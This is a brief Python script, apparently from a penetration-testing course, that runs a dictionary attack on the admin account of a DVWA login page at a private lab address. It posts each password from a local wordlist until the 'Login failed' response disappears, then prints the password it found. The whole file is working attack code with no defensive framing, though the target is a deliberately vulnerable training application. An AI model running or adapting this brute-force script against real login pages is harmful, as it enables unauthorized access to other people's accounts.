#!/usr/bin/python3

import requests

target_url = "http://192.168.154.144/dvwa/login.php"
data_dictionary = {"username":"admin", "password":"", "Login":"submit"}

with open("/root/Desktop/passwords.txt", "r") as wordlist_file: #open a file
    for line in wordlist_file: #read file one line at a time 
        word = line.strip()
        data_dictionary["password"] = word
        response = requests.post(target_url, data=data_dictionary)
        if "Login failed" not in str(response.content):
            print("[+] We have found the password >> " + word)
            exit()

print("[+] We have reached the end of the wordlist.")